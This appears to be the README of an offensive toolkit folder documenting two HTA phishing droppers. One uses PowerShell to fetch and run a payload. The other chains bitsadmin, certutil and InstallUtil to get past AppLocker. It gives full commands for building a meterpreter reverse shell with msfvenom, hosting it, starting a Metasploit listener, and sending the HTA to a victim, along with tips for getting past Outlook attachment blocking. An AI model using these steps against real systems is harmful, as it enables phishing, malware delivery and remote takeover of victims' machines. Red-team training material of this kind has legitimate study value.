# hta

Three files. Two are dropper payloads, one is a documentation file. The two droppers are **standalone** — pick one based on how restrictive the target environment is.

---

## File Roles

| File | Standalone? | Complexity | How it delivers payload |
|------|-------------|------------|------------------------|
| `clickme.hta` | Yes | Simple | PS downloads .exe → saves → runs |
| `nonDN2J.hta` | Yes | Chain (LOLBins) | bitsadmin → certutil → InstallUtil |
| `DotNetToJScript HTA Phishing Attack.md` | — | Notes | Documentation only |

Both run via `mshta.exe` when the victim opens the `.hta` file. HTAs are treated as trusted Windows applications — they have full access to ActiveX objects.

---

## clickme.hta — Simple Dropper

Uses `WScript.Shell.Run()` to execute PowerShell, which downloads your payload `.exe` and runs it.

**Customize:**
```javascript
var url  = "http://<YOUR_KALI_IP>/runner.exe";   // ← change this
var dest = "C:\\Users\\Public\\runner.exe";        // ← writable path, usually fine
```

**Prepare and deliver:**
```bash
# 1. Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe -o runner.exe

# 2. Host it and the HTA
cp runner.exe /var/www/html/
cp clickme.hta /var/www/html/
python3 -m http.server 80

# 3. Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; exploit -j"

# 4. Send the link to the target:
#    http://<KALI_IP>/clickme.hta
#    Or email as attachment
```

---

## nonDN2J.hta — AppLocker Bypass Chain

Uses only Windows-signed built-in utilities — no PowerShell directly invoked. Designed for environments where PowerShell execution is restricted.

**Chain:**
```
bitsadmin   →   certutil   →   InstallUtil
(download        (base64        (runs .exe under
base64 file)      decode)        AppLocker bypass)
```

**Customize:**
```javascript
var url = "http://<YOUR_KALI_IP>/enc3.txt";   // ← URL of your BASE64-ENCODED binary
```

**Prepare the payload:**
```bash
# 1. Generate payload compiled for InstallUtil bypass
#    (see 01-evasion/applocker-bypass/installutil-bypass.cs)
#
#    Visual Studio (Windows dev box):
#      File → New → Console App (.NET Framework), name "bypass", .NET Framework 4.8
#      Add Reference → System.Management.Automation.dll (if needed by your loader)
#      Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
#      Build → Build Solution → output: bin\x64\Debug\bypass.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:bypass.exe installutil-bypass.cs

# 2. Base64 encode the .exe
certutil -encode bypass.exe enc3.txt
# Or on Kali:
base64 bypass.exe > enc3.txt

# 3. Host enc3.txt (the base64 file, NOT the .exe)
cp enc3.txt /var/www/html/
python3 -m http.server 80

# 4. Edit the URL in nonDN2J.hta, host the HTA, send to target
```

**What happens on the victim:**
1. `bitsadmin` downloads `enc3.txt` (base64 data) → `C:\Windows\Temp\enc3.txt`
2. `certutil -decode` converts it back to the `.exe` → `C:\Windows\Temp\bypass.exe`
3. `InstallUtil.exe /U bypass.exe` runs the payload without AppLocker blocking it

---

## Notes

- `.hta` files open with `mshta.exe` by default. They can be emailed, or the victim can be tricked into clicking a link.
- Modern Outlook blocks `.hta` attachments — rename or zip if needed.
- `clickme.hta` requires PowerShell to be functional. If PS is locked down, use `nonDN2J.hta`.
